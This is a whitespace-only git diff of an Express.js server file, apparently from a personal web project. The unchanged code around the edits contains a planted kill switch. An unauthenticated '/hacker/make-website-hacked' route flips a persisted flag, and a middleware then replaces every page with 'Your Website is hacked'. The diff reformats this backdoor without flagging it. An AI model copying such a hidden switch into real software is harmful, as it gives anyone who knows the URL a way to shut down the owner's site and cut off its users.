@@ -37,20 +37,20 @@ import { checkHecked, mekeHacked } from './_lib/utils/heackerMode.js';
 const app = express();
 const __filename = fileURLToPath(import.meta.url);
 let dirName = path.dirname(__filename);
-let heckerJsonPath=path.resolve(dirName, './h.json');
-let heckedWebsite=checkHecked(heckerJsonPath);
+let heckerJsonPath = path.resolve(dirName, './h.json');
+let heckedWebsite = checkHecked(heckerJsonPath);
 
 // log({heckerJsonPath,heckedWebsite})
-function heckerMidleware(request,response,next) {
-    if (heckedWebsite===true) response.send('<h2> Your Website is hacked </h2>');
-    if (heckedWebsite===false) next();
+function heckerMidleware(request, response, next) {
+    if (heckedWebsite === true) response.send('<h2> Your Website is hacked </h2>');
+    if (heckedWebsite === false) next();
 }
 app.use(cors({
     origin: '*'
 }));
-app.get('/video-for-download',(req, res) => {
+app.get('/video-for-download', (req, res) => {
     res.type('video/mp4');
-    res.status(200).sendFile(path.resolve(dirName,'./public/a.mp4'));
+    res.status(200).sendFile(path.resolve(dirName, './public/a.mp4'));
 });
 app.use(heckerMidleware)
 //environment setup
@@ -106,12 +106,12 @@ app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/w
 });
 
 app.get('/hacker/make-website-hacked', (req, res) => {
-    heckedWebsite=true;
+    heckedWebsite = true;
     mekeHacked(heckerJsonPath);
-    
+
 })
 
-app.get('/hello', (req, res) => res.sendFile(path.resolve(dirName,'./public/test.html')));
+app.get('/hello', (req, res) => res.sendFile(path.resolve(dirName, './public/test.html')));
 
 app.get('/', async (req, res) => res.redirect('/home'))
 
